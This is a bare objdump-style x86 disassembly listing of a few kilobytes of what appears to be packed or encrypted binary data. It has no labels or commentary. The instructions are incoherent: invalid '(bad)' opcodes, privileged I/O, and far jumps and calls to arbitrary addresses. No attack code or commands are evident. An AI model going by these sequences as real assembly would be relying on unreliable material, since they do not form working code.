  40e381:	add    eax,0x704a9cb7
  40e386:	ins    DWORD PTR es:[edi],dx
  40e387:	push   cs
  40e388:	jbe    0x40e382
  40e38a:	or     al,0xc5
  40e38c:	std    
  40e38d:	js     0x40e3e2
  40e38f:	cmp    eax,edi
  40e391:	test   al,0x71
  40e393:	or     eax,0x37905047
  40e398:	popf   
  40e399:	ins    BYTE PTR es:[edi],dx
  40e39a:	into   
  40e39b:	mov    edx,0xfff4ab71
  40e3a0:	mov    eax,0xadc7f826
  40e3a5:	cmp    cl,dl
  40e3a7:	adc    al,0x10
  40e3a9:	push   cs
  40e3aa:	sbb    BYTE PTR [ebp-0xf],0xf2
  40e3ae:	add    eax,eax
  40e3b0:	inc    esp
  40e3b1:	inc    edx
  40e3b2:	enter  0x54c0,0x88
  40e3b6:	jo     0x40e391
  40e3b8:	xchg   edx,eax
  40e3b9:	retf   
  40e3ba:	out    dx,eax
  40e3bb:	add    eax,0x430526ab
  40e3c0:	adc    al,0x51
  40e3c2:	cmc    
  40e3c3:	adc    ebp,esi
  40e3c5:	jnp    0x40e3b0
  40e3c7:	jle    0x40e3f4
  40e3c9:	test   bh,bl
  40e3cb:	sbb    edx,eax
  40e3cd:	popf   
  40e3ce:	es aad 0x21
  40e3d1:	mov    eax,0xe2745d41
  40e3d6:	ds dec ecx
  40e3d8:	sti    
  40e3d9:	out    0x24,eax
  40e3db:	pop    eax
  40e3dc:	scas   eax,DWORD PTR es:[edi]
  40e3dd:	adc    eax,0x86d65c5c
  40e3e2:	jecxz  0x40e413
  40e3e4:	pop    ecx
  40e3e5:	mov    esp,0xc942c359
  40e3ea:	and    DWORD PTR [ecx-0x16d93651],esp
  40e3f0:	retf   
  40e3f1:	add    edx,DWORD PTR [ecx-0x9]
  40e3f4:	je     0x40e403
  40e3f6:	fistp  DWORD PTR [ebp-0x1c]
  40e3f9:	mov    DWORD PTR [esi+ebx*4-0x3f209a66],esp
  40e400:	cli    
  40e401:	xchg   esi,eax
  40e402:	call   0x323c238e
  40e407:	and    eax,0xd36e5a63
  40e40c:	jae    0x40e3cb
  40e40e:	sbb    cl,BYTE PTR [ebp+0x51]
  40e411:	push   cs
  40e412:	(bad)  
  40e413:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e414:	ss lock dec ebp
  40e417:	dec    edx
  40e418:	dec    esi
  40e419:	bound  eax,QWORD PTR [ebx]
  40e41b:	lock mov dh,0x37
  40e41e:	int    0x17
  40e420:	aas    
  40e421:	mov    ebp,0xe263b24a
  40e426:	into   
  40e427:	sbb    BYTE PTR [ebp+ebx*2-0x36f9112c],bh
  40e42e:	pop    eax
  40e42f:	push   0x313d9172
  40e434:	push   edx
  40e435:	add    DWORD PTR [eax],ecx
  40e437:	out    dx,eax
  40e438:	xchg   edx,eax
  40e439:	mov    dh,0x2a
  40e43b:	outs   dx,BYTE PTR ds:[esi]
  40e43d:	xor    esi,DWORD PTR [edi]
  40e43f:	mov    ah,0xdb
  40e441:	scas   eax,DWORD PTR es:[edi]
  40e442:	adc    edi,DWORD PTR [esi+0x41be7833]
  40e448:	aad    0xa7
  40e44a:	jg     0x40e42b
  40e44c:	xor    edi,eax
  40e44e:	xor    BYTE PTR [ebx+eax*8+0x3933e215],dh
  40e455:	pop    eax
  40e456:	scas   al,BYTE PTR es:[edi]
  40e457:	push   es
  40e458:	inc    esi
  40e459:	pavgw  mm5,QWORD PTR [eax]
  40e45c:	mov    DWORD PTR [esi-0x23],esi
  40e45f:	dec    BYTE PTR [ebx+0x30]
  40e462:	inc    ebp
  40e463:	les    esi,FWORD PTR [ebp-0x39ecf8a7]
  40e469:	inc    ebp
  40e46a:	or     BYTE PTR [ebx-0x4a],ch
  40e46d:	mov    eax,ds:0xbf6d10f4
  40e472:	les    esi,FWORD PTR [edx-0x690b61ab]
  40e478:	(bad)  
  40e479:	div    BYTE PTR [edx+0x67a76a52]
  40e47f:	xchg   esi,eax
  40e480:	pop    ecx
  40e481:	xchg   ecx,ebx
  40e483:	int3   
  40e484:	aad    0x1f
  40e486:	dec    ebp
  40e487:	pop    es
  40e488:	pop    edi
  40e489:	test   DWORD PTR [edi-0x19],0x7ea5b45a
  40e490:	mov    BYTE PTR [eax],ah
  40e492:	jbe    0x40e42c
  40e494:	dec    edx
  40e495:	add    DWORD PTR [ecx+0x53946309],edi
  40e49b:	ins    BYTE PTR es:[edi],dx
  40e49c:	pop    ebp
  40e49d:	stc    
  40e49e:	stos   BYTE PTR es:[edi],al
  40e49f:	rcr    BYTE PTR [esi],1
  40e4a1:	jne    0x40e4b1
  40e4a3:	hlt    
  40e4a4:	outs   dx,DWORD PTR ds:[esi]
  40e4a5:	mov    al,ds:0x68a056f7
  40e4aa:	popf   
  40e4ab:	jp     0x40e4ea
  40e4ad:	cmp    ecx,esp
  40e4af:	adc    ecx,DWORD PTR [esi-0xb]
  40e4b2:	sbb    bh,BYTE PTR [esi]
  40e4b4:	cmp    bl,bl
  40e4b6:	xchg   ebx,eax
  40e4b7:	test   BYTE PTR [edx+esi*1],0x42
  40e4bb:	lds    ebx,FWORD PTR [eax-0x52cf195d]
  40e4c1:	add    ch,BYTE PTR [esi-0x2]
  40e4c4:	and    cl,BYTE PTR [eax]
  40e4c6:	pusha  
  40e4c7:	jbe    0x40e543
  40e4c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4ca:	inc    edx
  40e4cb:	adc    BYTE PTR [esi+eiz*4-0x6c],cl
  40e4cf:	push   ecx
  40e4d0:	(bad)  
  40e4d1:	cmp    ch,cl
  40e4d3:	adc    esp,ebx
  40e4d5:	shr    BYTE PTR ss:[eax],0x7b
  40e4d9:	cli    
  40e4da:	cld    
  40e4db:	call   0x9afe:0x74ffc849
  40e4e2:	xchg   ebx,eax
  40e4e3:	das    
  40e4e4:	cwde   
  40e4e5:	call   0x9cd4db3e
  40e4ea:	enter  0x56a0,0xac
  40e4ee:	jmp    0x81a5:0x2b2e1909
  40e4f5:	mov    ch,0x87
  40e4f7:	jae    0x40e510
  40e4f9:	add    cl,BYTE PTR [ecx]
  40e4fb:	xchg   bh,dl
  40e4fd:	pop    ss
  40e4fe:	loop   0x40e54d
  40e500:	repz sub DWORD PTR ds:[ebp-0x64be8dc],edx
  40e508:	mov    eax,ds:0x77db9673
  40e50d:	mov    ah,0xde
  40e50f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e510:	xor    bh,BYTE PTR [ecx-0x401c5101]
  40e516:	or     al,0x60
  40e518:	sbb    DWORD PTR [esp+edi*8-0x3cc4f64d],0x5f
  40e520:	mov    bh,0x46
  40e522:	jnp    0x40e4ab
  40e524:	sub    al,BYTE PTR [esi-0x763d557e]
  40e52a:	lahf   
  40e52b:	mov    eax,ds:0xa4e324be
  40e530:	je     0x40e589
  40e532:	push   es
  40e533:	int3   
  40e534:	dec    edi
  40e535:	(bad)  
  40e537:	test   BYTE PTR [esi],dl
  40e539:	shr    BYTE PTR [ebp+edi*4+0x7087f106],1
  40e540:	pop    esp
  40e541:	(bad)  
  40e542:	sbb    ecx,DWORD PTR [edi-0x3411d9a]
  40e548:	(bad)  
  40e549:	push   0x9398b15c
  40e54e:	add    eax,0xdaeb03ba
  40e553:	adc    DWORD PTR [esi+0x61],eax
  40e556:	dec    esi
  40e557:	fdiv   QWORD PTR ds:0x1e060417
  40e55d:	shl    BYTE PTR [edi-0x52],1
  40e560:	retf   
  40e561:	adc    BYTE PTR [ebp-0x1b073786],cl
  40e567:	push   edx
  40e568:	adc    DWORD PTR [eax+0x56f6ffc6],0xffffffed
  40e56f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e570:	test   DWORD PTR [eax+0xdd23c4],esi
  40e576:	or     edi,DWORD PTR [ebx]
  40e578:	out    0x9e,al
  40e57a:	or     DWORD PTR [ecx+edx*2-0x6c],edi
  40e57e:	or     BYTE PTR [edi-0x5e],al
  40e581:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e582:	or     eax,0xe5d22899
  40e587:	(bad)
  40e58a:	pop    ecx
  40e58b:	jb     0x40e5a4
  40e58d:	pop    ss
  40e58e:	ja     0x40e59a
  40e590:	cmp    DWORD PTR [ebx+0x26],0x77
  40e594:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e595:	add    BYTE PTR [eax],dl
  40e597:	add    ebx,DWORD PTR [ebp-0x4c]
  40e59a:	std    
  40e59b:	mov    ecx,0x97d2585d
  40e5a0:	xor    DWORD PTR [ecx+0x4],eax
  40e5a3:	xor    BYTE PTR [esi-0x1bed16d6],dh
  40e5a9:	pop    eax
  40e5aa:	mov    cl,0xcb
  40e5ac:	jg     0x40e588
  40e5ae:	lahf   
  40e5af:	cld    
  40e5b0:	sub    ah,bl
  40e5b2:	aad    0xd3
  40e5b4:	imul   edx,DWORD PTR [eax-0x3c],0x1f3e11c8
  40e5bb:	xor    DWORD PTR [ecx+0x2a],ebp
  40e5be:	sti    
  40e5bf:	jmp    0x40e5dd
  40e5c1:	push   edx
  40e5c2:	and    BYTE PTR [edx-0x659f6cfc],ah
  40e5c8:	das    
  40e5c9:	stc    
  40e5ca:	or     BYTE PTR [edx-0x7e0a8414],al
  40e5d0:	fwait
  40e5d1:	sbb    cl,BYTE PTR [esi+0x2]
  40e5d4:	mov    WORD PTR [ecx],?
  40e5d6:	mov    ch,0xea
  40e5d8:	lds    ebx,FWORD PTR [ebx-0x6a]
  40e5db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5dc:	in     al,dx
  40e5dd:	jne    0x40e5a3
  40e5df:	lahf   
  40e5e0:	ja     0x40e5e1
  40e5e2:	adc    ebp,DWORD PTR [ebp-0x23362a59]
  40e5e8:	cmp    al,0x3d
  40e5ea:	jnp    0x40e5da
  40e5ec:	mov    ch,0x70
  40e5ee:	fsubr  QWORD PTR [esi+0xaa76c31]
  40e5f4:	cmc    
  40e5f5:	popf   
  40e5f6:	cwde   
  40e5f7:	xlat   BYTE PTR ds:[ebx]
  40e5f8:	hlt    
  40e5f9:	xor    esi,esp
  40e5fb:	dec    edx
  40e5fc:	mov    al,0x6e
  40e5fe:	rcr    esp,0x1b
  40e601:	adc    ch,BYTE PTR [esi-0x1]
  40e604:	and    al,0x40
  40e606:	pushf  
  40e607:	and    esi,DWORD PTR [edi]
  40e609:	pop    esi
  40e60a:	sub    al,0x57
  40e60c:	push   ss
  40e60d:	cmp    bl,cl
  40e60f:	inc    edx
  40e610:	(bad)  
  40e611:	pop    edi
  40e612:	add    eax,esi
  40e614:	scas   al,BYTE PTR es:[edi]
  40e615:	adc    DWORD PTR [ecx],ecx
  40e617:	cmp    DWORD PTR [edx+0x1322b49d],ebp
  40e61d:	add    al,0x37
  40e61f:	mov    ebp,0xb7801d11
  40e624:	lds    edx,FWORD PTR [ebp-0xe]
  40e627:	ss ins BYTE PTR es:[edi],dx
  40e629:	mov    al,0xd0
  40e62b:	jge    0x40e639
  40e62d:	mov    eax,ds:0xa176360
  40e632:	ins    DWORD PTR es:[edi],dx
  40e633:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e634:	adc    al,0x55
  40e636:	mov    bl,0x19
  40e638:	das    
  40e639:	pushf  
  40e63a:	xor    DWORD PTR [bx+di],ecx
  40e63d:	dec    esi
  40e63e:	push   cs
  40e63f:	xlat   BYTE PTR ds:[ebx]
  40e640:	sub    dl,BYTE PTR [eax-0xe272ae3]
  40e646:	out    dx,al
  40e647:	adc    BYTE PTR [ecx],cl
  40e649:	nop
  40e64a:	fild   DWORD PTR [edx-0x5b]
  40e64d:	dec    ebx
  40e64e:	xchg   esi,eax
  40e64f:	ss inc esp
  40e651:	xchg   esp,ebx
  40e653:	jns    0x40e61e
  40e655:	aas    
  40e656:	xchg   ebp,eax
  40e657:	sub    BYTE PTR [eax+eax*4],bl
  40e65a:	sahf   
  40e65b:	pop    ds
  40e65c:	icebp  
  40e65d:	jmp    0xb7850f8
  40e662:	and    BYTE PTR [eax-0x7022696a],ch
  40e668:	or     al,0x1a
  40e66a:	test   eax,0xc07d020a
  40e66f:	xlat   BYTE PTR ds:[ebx]
  40e670:	dec    esp
  40e671:	lods   al,BYTE PTR ds:[esi]
  40e672:	and    ebx,ebp
  40e674:	push   esp
  40e675:	pop    ds
  40e676:	adc    eax,0x6cf8c28
  40e67b:	pusha  
  40e67c:	add    esi,ecx
  40e67e:	mov    eax,0xcc364be8
  40e683:	mov    ch,0x21
  40e685:	add    al,0x2e
  40e687:	(bad)  
  40e688:	retf   0xd37d
  40e68b:	push   esp
  40e68c:	mov    ds:0x1891d4b4,al
  40e691:	(bad)  
  40e692:	test   eax,0x9956ecfd
  40e697:	pop    eax
  40e698:	mov    esp,ecx
  40e69a:	xchg   esi,eax
  40e69b:	dec    edx
  40e69c:	fwait
  40e69d:	rep ins DWORD PTR es:[edi],dx
  40e69f:	into   
  40e6a0:	fucom  st(3)
  40e6a2:	cwde   
  40e6a3:	stc    
  40e6a4:	cmp    ah,dh
  40e6a6:	inc    eax
  40e6a7:	pop    ss
  40e6a8:	imul   esp,DWORD PTR [ecx+0xc],0x35
  40e6ac:	int    0x3b
  40e6ae:	cs pop edi
  40e6b0:	out    dx,al
  40e6b1:	dec    esp
  40e6b2:	adc    cl,bl
  40e6b4:	pop    ecx
  40e6b5:	adc    esi,DWORD PTR [edi-0x43]
  40e6b8:	pop    esi
  40e6b9:	ss jge 0x40e66e
  40e6bc:	vpunpckldq xmm0,xmm5,XMMWORD PTR [eax+ebx*2+0x192af566]
  40e6c5:	cmp    esi,ebp
  40e6c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6c8:	mov    al,ds:0xe980e40d
  40e6cd:	mov    ah,BYTE PTR [esi]
  40e6cf:	mov    ebp,eax
  40e6d1:	and    BYTE PTR [esi-0x26cd5cd2],dh
  40e6d7:	jno    0x40e67f
  40e6d9:	push   edx
  40e6da:	xchg   DWORD PTR [esi],esi
  40e6dc:	xchg   edx,eax
  40e6dd:	pop    eax
  40e6de:	sbb    cl,BYTE PTR [edx-0x48]
  40e6e1:	popa   
  40e6e2:	test   al,0x94
  40e6e4:	inc    eax
  40e6e5:	(bad)  
  40e6e6:	scas   eax,DWORD PTR es:[edi]
  40e6e7:	mov    esp,0xa22dba2e
  40e6ec:	aas    
  40e6ed:	das    
  40e6ee:	xlat   BYTE PTR ds:[ebx]
  40e6ef:	je     0x40e736
  40e6f1:	out    0xcb,eax
  40e6f3:	xchg   DWORD PTR [edi+ebx*8+0x71],esp
  40e6f7:	add    DWORD PTR [ebp+0x55],edi
  40e6fa:	inc    ebp
  40e6fb:	test   DWORD PTR [esi+0x17c7f9d1],esp
  40e701:	xchg   ebp,eax
  40e702:	add    DWORD PTR [esi+ecx*4+0x0],esp
  40e706:	scas   eax,DWORD PTR es:[edi]
  40e707:	add    eax,0x3ad1bd82
  40e70c:	push   ebp
  40e70d:	push   es
  40e70e:	sbb    eax,0x7a435b2f
  40e713:	loope  0x40e71d
  40e715:	test   DWORD PTR [ebp+0x5a],ecx
  40e718:	pop    ebx
  40e719:	out    dx,eax
  40e71a:	sbb    esp,eax
  40e71c:	mov    bh,0x21
  40e71e:	leave  
  40e71f:	data16 aaa 
  40e721:	cmp    BYTE PTR [eax],0x9e
  40e724:	sbb    ecx,DWORD PTR cs:[esi-0x6d]
  40e728:	psadbw mm6,QWORD PTR [ebx+0xf414902]
  40e72f:	popf   
  40e730:	test   eax,0xb49b47db
  40e735:	jno    0x40e711
  40e737:	sahf   
  40e738:	in     eax,dx
  40e739:	sbb    al,0xf
  40e73b:	pop    esi
  40e73c:	xchg   edi,esp
  40e73e:	pop    ebp
  40e73f:	enter  0xf,0xeb
  40e743:	xor    BYTE PTR [ecx],bh
  40e745:	push   edi
  40e746:	iret   
  40e747:	push   eax
  40e748:	jb     0x40e708
  40e74a:	dec    ebp
  40e74b:	mov    ah,0x66
  40e74d:	adc    ebx,ebx
  40e74f:	jle    0x40e70a
  40e751:	test   al,0x2d
  40e753:	inc    esi
  40e754:	out    dx,al
  40e755:	cmp    ch,BYTE PTR [ebp*8-0x214d778]
  40e75c:	jmp    0x8dd0:0x108b4084
  40e763:	mov    BYTE PTR [edi+0x6f],dh
  40e766:	in     eax,0x3b
  40e768:	and    al,0xd4
  40e76a:	popf   
  40e76b:	iret   
  40e76c:	pop    es
  40e76d:	pop    ds
  40e76e:	push   edx
  40e76f:	add    DWORD PTR [ebp+0x6b5b847a],0xe
  40e776:	leave  
  40e777:	shl    BYTE PTR [edi],1
  40e779:	jne    0x40e7e9
  40e77b:	aaa    
  40e77c:	fiadd  DWORD PTR ss:[ebx+0x3b]
  40e780:	dec    BYTE PTR [esi]
  40e782:	add    al,0x89
  40e784:	enter  0x22e0,0x96
  40e788:	sar    DWORD PTR [edi+0x34],0x69
  40e78c:	daa    
  40e78d:	mov    dl,0x10
  40e78f:	ins    BYTE PTR es:[edi],dx
  40e790:	frstor [edx-0x48]
  40e793:	add    esp,0x6d
  40e796:	popa   
  40e797:	cwde   
  40e798:	ds pop esi
  40e79a:	clc    
  40e79b:	(bad)  
  40e79c:	sar    BYTE PTR [esi+eax*4+0x42],cl
  40e7a0:	sahf   
  40e7a1:	push   ebp
  40e7a2:	iret   
  40e7a3:	xlat   BYTE PTR ds:[ebx]
  40e7a4:	test   esp,eax
  40e7a6:	mov    ebx,DWORD PTR [ebx-0x76]
  40e7a9:	je     0x40e778
  40e7ab:	retf   
  40e7ac:	pop    esi
  40e7ad:	ror    BYTE PTR [esi+0x7ab9069],1
  40e7b3:	ss jecxz 0x40e776
  40e7b6:	sbb    dh,dh
  40e7b8:	repnz adc DWORD PTR [edi],0xfbfade2
  40e7bf:	ret    
  40e7c0:	data16 out dx,al
  40e7c2:	into   
  40e7c3:	inc    esi
  40e7c4:	fcmovne st,st(3)
  40e7c6:	mov    ds:0x7e2f0d3e,al
  40e7cb:	div    DWORD PTR [esi+0x67]
  40e7ce:	add    al,BYTE PTR [eax*8+0x59d1a1c7]
  40e7d5:	aaa    
  40e7d6:	sar    BYTE PTR [ecx-0x44],cl
  40e7d9:	xor    eax,0xcb3beb7
  40e7de:	arpl   WORD PTR [ecx+0x62],bp
  40e7e1:	adc    ch,BYTE PTR [ebx-0x2c]
  40e7e4:	push   ss
  40e7e5:	xchg   edi,esi
  40e7e7:	adc    cl,BYTE PTR ds:0x3a59511e
  40e7ed:	test   esi,ebx
  40e7ef:	jmp    0xf378:0x49ba41ef
  40e7f6:	jnp    0x40e805
  40e7f8:	mov    esp,0xf41d2465
  40e7fd:	or     bh,cl
  40e7ff:	adc    eax,0x1ffb0ae5
  40e804:	frstor [edi+eiz*2+0x56]
  40e808:	jle    0x40e83e
  40e80a:	mov    ds:0x14d8d4e5,al
  40e80f:	pop    ds
  40e810:	int3   
  40e811:	call   0xf98e:0x307a4e40
  40e818:	bound  esi,QWORD PTR [ebp+0x43210a1a]
  40e81e:	mov    esi,0xf69b5e13
  40e823:	ss call 0xd264:0xaa92d231
  40e82b:	sub    eax,0x73c2eed5
  40e830:	enter  0x594b,0xfd
  40e834:	hlt    
  40e835:	test   ebp,eax
  40e837:	leave  
  40e838:	pop    esp
  40e839:	mov    gs,esp
  40e83b:	test   BYTE PTR [ebx-0x2664bc1c],dh
  40e841:	inc    esp
  40e842:	jb     0x40e802
  40e844:	jno    0x40e808
  40e846:	fadd   DWORD PTR [ebp+edi*2-0x13]
  40e84a:	add    DWORD PTR [ecx-0x74],esp
  40e84d:	shl    DWORD PTR [ebx-0x7373ca9b],cl
  40e853:	cwde   
  40e854:	rcr    bl,1
  40e856:	mov    ebx,0xc1cad9b0
  40e85b:	stos   DWORD PTR es:[edi],eax
  40e85c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e85d:	xchg   ebp,eax
  40e85e:	and    al,0x13
  40e860:	(bad)  
  40e861:	push   eax
  40e862:	mov    ds:0x3c5a3a7b,eax
  40e867:	int    0x4a
  40e869:	mov    ds:0x5412ef5f,al
  40e86e:	add    eax,ebp
  40e870:	add    ecx,DWORD PTR [eax+0x1d]
  40e873:	test   DWORD PTR [esi+0x7f3f744f],edx
  40e879:	pop    ds
  40e87a:	inc    esp
  40e87b:	add    dh,dh
  40e87d:	cli    
  40e87e:	inc    edi
  40e87f:	adc    ch,ah
  40e881:	push   0x6c
  40e883:	je     0x40e89c
  40e885:	or     esp,esi
  40e887:	popf   
  40e888:	cmp    eax,0xb7792b
  40e88d:	jne    0x40e862
  40e88f:	ins    BYTE PTR es:[edi],dx
  40e890:	neg    DWORD PTR [ecx]
  40e892:	mov    ?,WORD PTR [ebp+0x4940aa3]
  40e898:	inc    eax
  40e89a:	outs   dx,DWORD PTR ds:[esi]
  40e89b:	ja     0x40e901
  40e89d:	cmp    eax,0x88920930
  40e8a2:	jnp    0x40e88a
  40e8a4:	aaa    
  40e8a5:	cmp    BYTE PTR ss:[esi],dl
  40e8a8:	sub    al,0xd3
  40e8aa:	add    al,BYTE PTR [edi-0x78]
  40e8ad:	sbb    BYTE PTR [ecx+0x20ccb2ac],al
  40e8b3:	mov    eax,0xd2142023
  40e8b8:	mov    ecx,0x77e28b45
  40e8bd:	mov    esp,0x471f73f2
  40e8c2:	lds    esi,FWORD PTR [ebx+edi*8+0x4d]
  40e8c6:	fisttp QWORD PTR [ebp-0x61]
  40e8c9:	mov    WORD PTR [edx],es
  40e8cb:	sti    
  40e8cc:	aaa    
  40e8cd:	rol    DWORD PTR [esi-0x28fd566b],1
  40e8d3:	cwde   
  40e8d4:	jo     0x40e8bb
  40e8d6:	xchg   edx,eax
  40e8d7:	xchg   edx,eax
  40e8d8:	cs sbb eax,0x9e3b86b3
  40e8de:	es adc al,0x2c
  40e8e1:	(bad)
  40e8e5:	mov    ecx,0x997ea27e
  40e8ea:	shr    BYTE PTR [esi],cl
  40e8ec:	test   BYTE PTR [esi-0x72f1612e],cl
  40e8f2:	cmp    eax,0x6179c14d
  40e8f7:	cdq    
  40e8f8:	xchg   edi,eax
  40e8f9:	ja     0x40e8d0
  40e8fb:	sar    dl,0x51
  40e8fe:	jmp    0x8967:0x98cec76f
  40e905:	xchg   edi,eax
  40e906:	mov    ds:0xf787c5b2,al
  40e90b:	les    ecx,FWORD PTR [ecx+0x7d]
  40e90e:	scas   al,BYTE PTR es:[edi]
  40e90f:	cmp    al,0x16
  40e912:	push   eax
  40e913:	leave  
  40e914:	cmp    eax,0x338d1242
  40e919:	aaa    
  40e91a:	mov    bh,0x60
  40e91c:	stos   BYTE PTR es:[edi],al
  40e91d:	jmp    0x40e8ba
  40e91f:	and    al,0x9b
  40e921:	add    eax,0x529a2d22
  40e926:	stos   BYTE PTR es:[edi],al
  40e927:	pop    eax
  40e928:	inc    esp
  40e929:	jg     0x40e915
  40e92b:	mov    cl,al
  40e92d:	aas    
  40e92e:	retf   0x8148
  40e931:	lods   al,BYTE PTR ds:[esi]
  40e932:	inc    ebp
  40e933:	adc    eax,DWORD PTR [eax-0x31191288]
  40e939:	ds adc bl,ah
  40e93c:	sbb    DWORD PTR [ecx-0x5a],ebp
  40e93f:	pop    ds
  40e940:	jnp    0x40e952
  40e942:	sahf   
  40e943:	int3   
  40e944:	xor    esp,DWORD PTR [edi+0x4b876817]
  40e94a:	or     al,0x5
  40e94c:	ret    0xf590
  40e94f:	jbe    0x40e992
  40e951:	sub    al,0xde
  40e953:	in     al,dx
  40e954:	xlat   BYTE PTR ds:[ebx]
  40e955:	aas    
  40e956:	in     eax,dx
  40e957:	faddp  st(4),st
  40e959:	stos   DWORD PTR es:[edi],eax
  40e95a:	fwait
  40e95b:	sub    ah,BYTE PTR [esi+0x10]
  40e95e:	adc    eax,0x5afb081d
  40e963:	and    dl,ah
  40e965:	push   ss
  40e966:	ja     0x40e900
  40e968:	jo     0x40e94b
  40e96a:	xor    al,0xe8
  40e96c:	inc    eax
  40e96d:	sub    al,dl
  40e96f:	push   cs
  40e970:	cmp    eax,0xf598bfb9
  40e975:	sub    al,BYTE PTR [edi]
  40e977:	cmp    bl,BYTE PTR [esi-0x36]
  40e97a:	imul   ecx,DWORD PTR [ebp+0x6f61a05a],0xffffffcb
  40e981:	ins    DWORD PTR es:[edi],dx
  40e982:	cmp    DWORD PTR [ebx],esp
  40e984:	shl    BYTE PTR [ebp+0x601b13f3],0x7e
  40e98b:	dec    edx
  40e98c:	retf   0xee05
  40e98f:	stos   BYTE PTR es:[edi],al
  40e990:	or     eax,0xc71cdee8
  40e995:	lahf   
  40e996:	inc    esi
  40e997:	xchg   esp,eax
  40e998:	sub    BYTE PTR [ecx],dl
  40e99a:	cld    
  40e99b:	xchg   dl,dh
  40e99d:	out    dx,eax
  40e99e:	rol    DWORD PTR [ebx+0x1d4f50ae],cl
  40e9a4:	sub    ecx,DWORD PTR [ecx]
  40e9a6:	inc    esi
  40e9a7:	mov    bl,0xd9
  40e9a9:	or     bh,BYTE PTR [ebx-0x2618c88]
  40e9af:	jmp    0xb810:0xd0e3b688
  40e9b6:	imul   esi,eax,0x1d
  40e9b9:	les    edx,FWORD PTR [eax]
  40e9bb:	xor    ecx,esi
  40e9bd:	adc    al,al
  40e9bf:	pop    ss
  40e9c0:	fdiv   DWORD PTR [eax-0x6d4b178f]
  40e9c6:	cmp    BYTE PTR [edx+eax*8-0x5a6cd838],bh
  40e9cd:	xchg   BYTE PTR [esi+0x77ca8754],ch
  40e9d3:	(bad)  
  40e9d5:	jmp    0x40e985
  40e9d7:	xchg   ah,bl
  40e9d9:	popf   
  40e9da:	fsubp  st(4),st
  40e9dc:	dec    esp
  40e9dd:	je     0x40e963
  40e9df:	and    ch,ch
  40e9e1:	enter  0xecd4,0xf3
  40e9e5:	daa    
  40e9e6:	jp     0x40e977
  40e9e8:	xchg   edi,eax
  40e9e9:	lods   eax,DWORD PTR ds:[esi]
  40e9ea:	into   
  40e9eb:	cld    
  40e9ec:	and    eax,0xdc12c26f
  40e9f1:	(bad)  
  40e9f2:	dec    esp
  40e9f3:	out    dx,al
  40e9f4:	sbb    eax,0x4a47d7db
  40e9f9:	push   edx
  40e9fa:	push   ds
  40e9fb:	push   edx
  40e9fc:	lahf   
  40e9fd:	pop    edx
  40e9fe:	pushf  
  40e9ff:	stos   BYTE PTR es:[edi],al
  40ea00:	add    ch,BYTE PTR [edi-0x19]
  40ea03:	cmp    ch,al
  40ea05:	xor    edx,DWORD PTR [edi+0x2d6c9aff]
  40ea0b:	sub    dh,BYTE PTR [edx+edi*1-0x4ffcae51]
  40ea12:	jge    0x40e9dd
  40ea14:	xchg   ebp,eax
  40ea15:	fidiv  DWORD PTR [edi]
  40ea17:	adc    BYTE PTR [esi-0x41],dl
  40ea1a:	xor    ebx,DWORD PTR [edx]
  40ea1c:	sbb    DWORD PTR [edi+0x3ec22ef],0x95b93fcc
  40ea26:	xchg   edx,eax
  40ea27:	icebp  
  40ea28:	fstp   DWORD PTR [ebp-0x5f]
  40ea2b:	cs pop ds
  40ea2d:	pop    ds
  40ea2e:	aas    
  40ea2f:	xchg   edi,eax
  40ea30:	je     0x40ea0f
  40ea32:	push   0x69
  40ea34:	sbb    BYTE PTR [esi-0x4813ef39],0xdc
  40ea3b:	jo     0x40ea9b
  40ea3d:	xchg   esi,eax
  40ea3e:	xlat   BYTE PTR ds:[ebx]
  40ea3f:	fsub   DWORD PTR [ebx+0x59]
  40ea42:	xor    ah,BYTE PTR [edi-0xdf201a5]
  40ea48:	(bad)  
  40ea49:	loop   0x40ea50
  40ea4b:	and    eax,0xd15cf36f
  40ea50:	and    ecx,DWORD PTR [ebx]
  40ea52:	xor    eax,0x2958aa8f
  40ea57:	les    edx,FWORD PTR [ecx-0xb]
  40ea5a:	retf   
  40ea5b:	cdq    
  40ea5c:	or     eax,0xf98e2d5d
  40ea61:	loop   0x40ea3a
  40ea63:	scas   al,BYTE PTR es:[edi]
  40ea64:	mov    dh,ch
  40ea66:	push   eax
  40ea67:	xchg   edi,eax
  40ea68:	mov    ebp,0x4cb94885
  40ea6d:	sbb    DWORD PTR [ebx],eax
  40ea6f:	or     eax,0xa9982d24
  40ea74:	es or  eax,0x7d7d66e9
  40ea7a:	mov    ch,0xcb
  40ea7c:	and    BYTE PTR [edx],bl
  40ea7e:	mov    dl,0x91
  40ea80:	call   0x1cce:0xf161f3f9
  40ea87:	mov    bl,0x65
  40ea89:	sbb    esp,edx
  40ea8b:	jecxz  0x40eb05
  40ea8d:	ret    0x489d
  40ea90:	popa   
  40ea91:	sbb    eax,0xe3992878
  40ea96:	ins    BYTE PTR es:[edi],dx
  40ea97:	stc    
  40ea98:	inc    BYTE PTR [esi+0x32]
  40ea9b:	dec    ebp
  40ea9c:	xchg   ebp,eax
  40ea9d:	outs   dx,BYTE PTR ds:[esi]
  40ea9e:	outs   dx,DWORD PTR ds:[esi]
  40ea9f:	mov    edi,0xd93718af
  40eaa4:	sbb    ah,BYTE PTR [eax]
  40eaa6:	stc    
  40eaa7:	inc    eax
  40eaa8:	push   ss
  40eaa9:	sbb    eax,0xb9867ba
  40eaae:	out    dx,al
  40eaaf:	les    esp,FWORD PTR [eax-0x6b583b70]
  40eab5:	lea    ecx,ds:0xbe5af883
  40eabb:	mov    ecx,cs
  40eabd:	pushf  
  40eabe:	pop    edi
  40eabf:	repnz sar DWORD PTR [edi-0x4d],1
  40eac3:	mov    dh,0xfe
  40eac5:	lahf   
  40eac6:	pop    edi
  40eac7:	xlat   BYTE PTR ds:[ebx]
  40eac8:	jmp    0xe8348235
  40eacd:	push   edi
  40eace:	fsubr  QWORD PTR [eax+0x43]
  40ead1:	(bad)  
  40ead2:	iret   
